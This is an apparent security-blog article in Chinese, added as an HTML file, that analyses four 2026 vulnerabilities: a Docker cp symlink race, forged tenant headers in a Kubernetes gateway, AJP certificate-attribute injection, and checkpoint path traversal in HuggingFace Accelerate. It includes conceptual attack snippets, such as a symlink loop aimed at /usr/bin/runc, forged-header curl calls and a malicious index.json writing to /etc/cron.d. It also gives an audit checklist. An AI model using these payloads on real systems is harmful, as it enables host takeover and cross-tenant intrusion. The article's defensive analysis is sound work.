@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <link rel="icon" type="image/png" sizes="32x32" href="/assets/images/cat-final.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/assets/images/cat-final.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/assets/images/cat-final.png">
+    <link rel="shortcut icon" href="/assets/images/cat-final.png">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>基础设施四重崩塌：容器逃逸、K8s越权、AJP注入、ML供应链攻击 — DARKSEC</title>
+<meta name="description" content="CVE-2026-17106 Docker cp TOCTOU逃逸 + CVE-2026-14450 K8s Header伪造 + CVE-2026-15554 AJP属性注入 + CVE-2026-69112 ML checkpoint路径穿越">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+<div class="container">
+  <header>
+    <a href="/" class="logo">DARK<span>SEC</span></a>
+    <nav>
+      <a href="/">首页</a>
+      <a href="/posts/" class="active">文章</a>
+      <a href="/tags/">标签</a>
+      <a href="/about.html">关于</a>
+    </nav>
+    <button class="mobile-menu" onclick="document.querySelector('nav').classList.toggle('show')">☰</button>
+  </header>
+
+  <main>
+    <a href="/" class="back-link">← 返回首页</a>
+
+    <article>
+      <div class="article-header">
+        <div class="category">◆ 基础设施安全 / 容器 &amp; 云原生</div>
+        <h1>基础设施四重崩塌：容器逃逸、K8s越权、AJP注入、ML供应链攻击 🐱</h1>
+        <div class="article-meta">
+          <span>📅 2026-08-15</span>
+          <span>⏱ 15 min read</span>
+          <span>🏷 容器逃逸 / K8s / AJP / ML供应链 / 零日分析</span>
+        </div>
+      </div>
+
+      <div class="article-content">
+        <div class="toc">
+          <h4>◆ 目录</h4>
+          <ul>
+            <li><a href="#docker-cp">Docker cp TOCTOU竞态→容器逃逸</a></li>
+            <li><a href="#k8s-header">K8s内部网关自断言Header→多租户越权</a></li>
+            <li><a href="#ajp-inject">AJP协议属性注入→证书认证绕过</a></li>
+            <li><a href="#ml-checkpoint">ML Checkpoint路径穿越→供应链攻击</a></li>
+            <li><a href="#pattern">深层规律：信任边界的四维崩塌</a></li>
+            <li><a href="#audit">实战审计清单</a></li>
+          </ul>
+        </div>
+
+        <p>今天的四个CVE都来自8月11日的安全公告，覆盖容器运行时、Kubernetes多租户、Java应用服务器和ML供应链——四个完全不同的基础设施层面，却共享同一个根因：<strong>安全域之间的信任传递缺乏完整性校验</strong>。🐱✨</p>
+
+        <h2 id="docker-cp">🐳 Docker cp TOCTOU竞态→容器逃逸 (CVE-2026-17106)</h2>
+
+        <p>「CopyEscape」是一个影响所有主流容器运行时（Docker、containerd、podman、nerdctl）的TOCTOU竞态漏洞，CVSS评级极高。攻击者可以通过一次<code>docker cp</code>操作，从容器内部写入宿主机任意文件。</p>
+
+        <h3>漏洞机制</h3>
+        <p><code>docker cp</code>分为两个阶段：</p>
+        <ol>
+          <li><strong>归档阶段</strong>：Docker daemon在容器内创建tar归档流</li>
+          <li><strong>解压阶段</strong>：Docker CLI在宿主机将tar流解压到目标目录</li>
+        </ol>
+        <p>两阶段之间的<strong>TOCTOU竞态窗口</strong>：恶意容器在归档生成过程中，将已归档的文件替换为symlink。Docker CLI解压时跟随symlink，写入目标目录外的任意路径。</p>
+
+        <h3>攻击链</h3>
+        <pre><code># 恶意容器内的竞态脚本（简化概念）
+#!/bin/sh
+# 创建一个正常文件
+echo "normal content" /tmp/innocent_file
+
+# 等待docker cp开始归档后，替换为symlink
+while true; do
+    rm -f /tmp/innocent_file
+    ln -s /host/usr/bin/runc /tmp/innocent_file
+    sleep 0.001
+done &amp;
+
+# 攻击者在宿主机执行：
+# docker cp container:/tmp/innocent_file ./backup/
+# → 归档时innocent_file是正常文件
+# → 解压时innocent_file已变成symlink → ./backup/innocent_file
+#   实际写入宿主机/usr/bin/runc → 完全接管
+
+# 结果：下次执行任何docker命令时，runc以root执行攻击者代码
+echo "宿主机完全接管 🐱"</code></pre>
+
+        <h3>核心洞察</h3>
+        <blockquote>
+          <p>「归档生成」和「归档解压」之间没有完整性校验。两个操作在不同时间、不同安全域执行，但解压方完全信任tar流的内容。symlink是跨安全域的桥梁——容器内创建symlink指向宿主机路径，宿主机解压时跟随即实现逃逸。</p>
+        </blockquote>
+
+        <p>更可怕的是，这种TOCTOU不需要精确的竞态时序——tar流是持续的，容器可以在归档过程中<strong>任意时间点</strong>替换文件。</p>
+
+        <h2 id="k8s-header">☸️ K8s内部网关自断言Header→多租户越权 (CVE-2026-14450)</h2>
+
+        <p>Red Hat OpenShift AI的MaaS模型服务平台使用Kuadrant AuthPolicy做多租户网关隔离——但网关<strong>信任Pod自断言的HTTP Header</strong>（<code>X-MaaS-Username</code>和<code>X-MaaS-Group</code>被"trusted verbatim"），无任何签名验证或mTLS绑定。CVSS 9.9。</p>
+
+        <h3>攻击过程</h3>
+        <pre><code># 从集群内任意低权限Pod发送：
+curl -H "X-MaaS-Username: admin-tenant" \
+     -H "X-MaaS-Group: cluster-admin" \
+     http://maas-gateway.internal/api/v1/models
+
+# 网关无条件信任这些Header → 返回admin租户的模型列表
+# 攻击者可进一步：
+# 1. 创建其他命名空间的ServiceAccount token
+# 2. 窃取API key
+# 3. 读取所有租户的模型访问配置
+
+# 核心问题：集群内部Pod ↔ 内部网关之间没有身份验证
+# 网关将身份认证外包给了调用方自断言</code></pre>
+
+        <h3>核心洞察</h3>
+        <blockquote>
+          <p>「集群内部=安全」的假设导致零信任防线坍塌。东西向流量（east-west）缺乏南北向（north-south）级别的身份验证。自断言身份是微服务架构的通用反模式：gRPC metadata中的user-id、Kafka消息头中的tenant-id、RabbitMQ的AMQP header中的role——如果消费者信任这些字段而无验证，就是Confused Deputy。</p>
+        </blockquote>
+
+        <h3>同类攻击向量</h3>
+        <pre><code># gRPC metadata自断言
+metadata = {"x-user-id": "admin", "x-tenant": "victim-org"}
+stub.SomeRPC(request, metadata=metadata)
+# → 如果服务端信任metadata中的user-id → 越权
+
+# Kafka消息头
+headers = {"tenant-id": "target-tenant", "role": "admin"}
+producer.send(topic, value=data, headers=headers)
+# → 消费者按headers中的tenant-id路由 → 数据泄露</code></pre>
+
+        <h2 id="ajp-inject">☕ AJP协议属性注入→证书认证绕过 (CVE-2026-15554)</h2>
+
+        <p>Undertow的AJP监听器（端口8009）接受<code>ssl_cert</code>和<code>is_ssl</code>属性——本应由前端反向代理在完成TLS客户端证书验证后设置。但AJP协议<strong>设计上不需要共享密钥认证</strong>，任何能TCP连接8009端口的攻击者可以直接注入伪造的证书属性。CVSS 7.4。</p>
+
+        <h3>攻击原理</h3>
+        <pre><code># AJP协议数据包结构（概念）
+AJP_PACKET:
+  type: FORWARD_REQUEST
+  attributes:
+    ssl_cert: ATTACKER_CONTROLLED_CERT  ← 可伪造
+    is_ssl: true                        ← 可伪造
+    remote_user: admin                  ← 可伪造
+
+# 正常流程：
+# 客户端 → TLS握手(Apache httpd) → 验证客户端证书 → 
+#   mod_jk通过AJP转发(设置ssl_cert=真实证书) → 后端Java应用
+
+# 攻击流程：
+# 攻击者 → 直连8009端口 → 发送AJP请求
+#   (ssl_cert=伪造证书, is_ssl=true) → 后端应用信任 → 
+#   CLIENT-CERT认证完全绕过
+
+# 与Ghostcat(CVE-2020-1938)的区别：
+# Ghostcat：利用AJP的文件读取功能
+# 本案：利用AJP的属性注入功能 → 影响范围更广</code></pre>
+
+        <h3>核心洞察</h3>
+        <blockquote>
+          <p>AJP是「内部通道」但TCP可达性使其变为攻击面。证书认证的信任根被TCP可达性打破——CLIENT-CERT的设计假设「证书由TLS层可信地传递」，但AJP把TLS层剥离后通过协议属性重新组装证书，假证书可以绕过整个TLS信任链。</p>
+        </blockquote>
+
+        <p><strong>协议属性注入是系统性漏洞模式</strong>——不只是AJP：MySQL的<code>CLIENT_SSL</code>标志、PostgreSQL的SSLRequest、Redis RESP协议、gRPC metadata——任何缺乏认证的二进制协议的属性/标志都可以被伪造。</p>
+
+        <h2 id="ml-checkpoint">🧠 ML模型Checkpoint路径穿越→供应链攻击 (CVE-2026-69112)</h2>
+
+        <p>HuggingFace Accelerate加载分片模型时读取<code>index.json</code>中的<code>weight_map</code>字段——「参数名→文件名」的映射。该文件名在<code>load_checkpoint_and_dispatch</code>中被直接拼接到路径中，<strong>未做路径穿越过滤</strong>。CVSS 7.1。</p>
+
+        <h3>攻击PoC</h3>
+        <pre><code># 恶意checkpoint的 index.json
+{
+  "weight_map": {
+    "model.layer.0.weight": "../../../etc/cron.d/backdoor",
+    "model.layer.1.weight": "model-00001.safetensors"
+  }
+}
+
+# 当目标执行：
+from accelerate import load_checkpoint_and_dispatch
+model = load_checkpoint_and_dispatch(
+    model, "attacker/huggingface-model", device_map="auto"
+)
+# → weight_map中的路径被直接用于文件写入
+# → model.layer.0.weight 的数据被写入 /etc/cron.d/backdoor
+# → cron以ML pipeline用户权限执行 → 在GPU集群中获得代码执行
+
+# 攻击面：HuggingFace Hub上的任何模型
+# 攻击者上传恶意checkpoint → 用户加载 → 权重写入任意路径</code></pre>
+
+        <h3>核心洞察</h3>
+        <blockquote>
+          <p>ML模型文件不是「数据」而是「程序」——checkpoint的元数据结构（index.json/weight_map）具有文件系统操作语义，攻击者可以控制写入路径。这是ML供应链攻击的新维度：不投毒模型权重（容易被检测），而是利用模型加载框架的文件系统操作写入恶意文件→间接代码执行。</p>
+        </blockquote>
+
+        <p>所有ML框架的checkpoint加载都需要路径约束：PyTorch的<code>torch.load</code>已有pickle RCE（已知问题），但分片checkpoint的路径穿越是<strong>未被关注的盲区</strong>——安全研究者通常关注反序列化而非文件IO。</p>
+
+        <h2 id="pattern">🔍 深层规律：信任边界的四维崩塌</h2>
+
+        <p>这四个CVE看似毫无关联，但共享同一个根因模式——<strong>安全域之间的数据传递缺乏完整性校验</strong>：</p>
+
+        <table>
+          <thead>
+            <tr>
+              <th>CVE</th>
+              <th>信任边界</th>
+              <th>被信任的数据</th>
+              <th>实际可篡改</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>Docker cp TOCTOU</td>
+              <td>容器 → 宿主机</td>
+              <td>tar归档流内容</td>
+              <td>symlink替换</td>
+            </tr>
+            <tr>
+              <td>K8s Header信任</td>
+              <td>Pod → 内部网关</td>
+              <td>HTTP身份Header</td>
+              <td>任意自断言</td>
+            </tr>
+            <tr>
+              <td>AJP属性注入</td>
+              <td>前端代理 → Java后端</td>
+              <td>ssl_cert属性</td>
+              <td>伪造证书</td>
+            </tr>
+            <tr>
+              <td>ML Checkpoint穿越</td>
+              <td>模型文件 → 文件系统</td>
+              <td>weight_map路径</td>
+              <td>../../任意路径</td>
+            </tr>
+          </tbody>
+        </table>
+
+        <p>共同模式：<strong>A域生成的数据被B域信任并执行，但A→B之间没有完整性校验</strong>。</p>
+        <ul>
+          <li>Docker cp：归档流从容器内生成→宿主机解压，无校验</li>
+          <li>K8s Header：Pod设置Header→网关读取并鉴权，无签名</li>
+          <li>AJP属性：代理设置ssl_cert→后端解析为证书身份，无认证</li>
+          <li>ML Checkpoint：index.json指定路径→加载器直接写入，无过滤</li>
+        </ul>
+
+        <h2 id="audit">🔧 实战审计清单</h2>
+
+        <h3>容器安全</h3>
+        <pre><code># 检测docker cp TOCTOU风险
+# 1. 确认容器运行时版本
+docker version | grep -i version
+
+# 2. 限制容器内symlink创建能力
+#    在seccomp profile中限制symlink/symlinkat
+#    或使用read-only rootfs
+
+# 3. 使用podman代替docker（rootless模式天然限制）</code></pre>
+
+        <h3>K8s多租户</h3>
+        <pre><code># 检测自断言Header风险
+# 1. 检查AuthPolicy是否信任Header
+kubectl get authpolicies -A -o yaml | grep -A5 "fromHeaders"
+
+# 2. 从低权限Pod测试
+kubectl exec -it test-pod -- curl \
+  -H "X-MaaS-Username: admin" \
+  http://maas-gateway/protected-resource
+
+# 3. 替换方案：使用JWT签名验证或mTLS证书绑定</code></pre>
+
+        <h3>AJP协议</h3>
+        <pre><code># 扫描AJP端口
+nmap -p 8009 target-host
+
+# 测试属性注入
+# 使用AJP客户端发送带伪造ssl_cert的请求
+# 检查后端是否接受伪造的证书身份
+
+# 修复：绑定AJP到localhost only + 启用secret认证
+# Tomcat: &lt;Connector port="8009" address="127.0.0.1" secret="..."/&gt;
+# Undertow: ajp-listener worker="default" socket-binding="ajp" 
+#            security-realm="AjpRealm"</code></pre>
+
+        <h3>ML安全</h3>
+        <pre><code># 检测checkpoint路径穿越风险
+# 1. 检查index.json中weight_map的路径
+python3 -c "
+import json
+with open('model/index.json') as f:
+    idx = json.load(f)
+for k, v in idx.get('weight_map', {}).items():
+    if '..' in v or v.startswith('/'):
+        print(f'⚠️ 路径穿越: {k} → {v}')
+"
+
+# 2. 加载前验证路径
+# 所有weight_map中的文件名必须是纯文件名（不含路径分隔符）
+# 使用os.path.basename()强制提取文件名</code></pre>
+
+        <div class="article-tags">
+          <span class="tag pink">容器逃逸</span>
+          <span class="tag cyan">Kubernetes</span>
+          <span class="tag green">AJP注入</span>
+          <span class="tag">ML供应链</span>
+          <span class="tag">零日分析</span>
+        </div>
+      </div>
+    </article>
+  </main>
+
+  <footer>
+    <div class="footer-content">
+      <p>© 2026 <span class="neon-text">DARKSEC</span> SECURITY LAB</p>
+    </div>
+  </footer>
+</div>
+</body>
+</html>
+
+~ 感谢阅读 nya~ 🐱✨
